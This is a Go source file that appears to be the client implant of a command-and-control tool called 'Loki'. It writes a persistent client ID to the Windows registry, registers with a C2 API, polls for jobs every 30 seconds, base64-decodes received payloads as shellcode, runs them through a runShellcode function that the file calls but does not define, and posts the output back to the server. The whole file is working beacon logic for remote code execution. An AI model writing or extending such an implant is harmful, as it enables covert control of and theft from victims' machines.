package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"golang.org/x/sys/windows/registry"
	"log"
	"net/http"
	"strconv"
	"time"
)

const apiUrl = "http://localhost:8000/api"

type JobBody struct {
	Id int `json:"id"`
	Code string `json:"code"`
}

func getClientId() string {
	clientId, _, err := getRegistryValue(registry.CURRENT_USER, `Software\Loki`, `ClientId`)
	if err == registry.ErrNotExist {
		clientId = uuid.New().String()
		err := setRegistryValue(registry.CURRENT_USER, `Software\Loki`, `ClientId`, clientId)
		if err != nil {
			log.Fatal(`Error storing registry value`)
		}
	} else if err != nil {
		log.Fatal(`Error retrieving registry value`)
	}
	return clientId
}

func registerClient() {
	clientId := getClientId()
	log.Println(`Client ID:`, clientId)

	postBody := []byte(fmt.Sprintf(`{"uuid":"%v"}`, clientId))
	resp, err := http.Post(apiUrl+"/register", "application/json", bytes.NewBuffer(postBody))
	if err != nil {
		log.Fatal(`Error creating request`)
	}

	if resp.StatusCode == 201 {
		log.Println(`Client registered successfully.`)
	} else if resp.StatusCode == 400 {
		log.Println(`Got 400 from server. Maybe client already registered?`)
	}

	err = resp.Body.Close()
	if err != nil {
		log.Fatal(`Error closing HTTP response`, err)
	}
}

func mainLoop() {
	clientId := getClientId()
	for {
		log.Println(`Querying available jobs`)

		postBody := []byte(fmt.Sprintf(`{"uuid":"%v"}`, clientId))
		resp, err := http.Post(apiUrl+"/jobs", "application/json", bytes.NewBuffer(postBody))
		if err != nil {
			log.Fatal(`Error with HTTP Post`, err)
		}

		var jobIds []int
		err = json.NewDecoder(resp.Body).Decode(&jobIds)
		if err != nil {
			log.Fatal(`Error decoding response JSON`)
		}

		err = resp.Body.Close()
		if err != nil {
			log.Fatal(`Error closing response body`, err)
		}

		for _, id := range jobIds {
			resp, err := http.Get(apiUrl + "/jobs/" + strconv.Itoa(id))
			if err != nil {
				log.Fatal(`Error with HTTP Get Job`, err)
			}

			var responseBody JobBody
			err = json.NewDecoder(resp.Body).Decode(&responseBody)
			if err != nil {
				log.Fatal(`HTTP Job: Error decoding JSON`, err)
			}

			err = resp.Body.Close()
			if err != nil {
				log.Fatal(`Error closing HTTP Job Response Body`, err)
			}

			shellcode, err := base64.StdEncoding.DecodeString(responseBody.Code)
			if err != nil {
				log.Fatal(`HTTP Job: Error decoding base64`, err)
			}

			fmt.Println(`Running Job ID:`, id)
			output, _ := runShellcode(shellcode)

			type JobReport struct {
				Uuid string `json:"uuid"`
				Output string `json:"output"`
			}
			report := &JobReport{
				Uuid:   getClientId(),
				Output: output,
			}
			reportJson, err := json.Marshal(report)
			if err != nil {
				log.Fatal(`Unable to marshal job output to JSON`, err)
			}
			resp, err = http.Post(apiUrl + "/jobs/" + strconv.Itoa(id) + "/report", "application/json",
				bytes.NewBuffer(reportJson))
			if err != nil {
				log.Fatal(`Error with HTTP Post Job Report`, err)
			}
		}
		time.Sleep(30 * time.Second)
	}
}
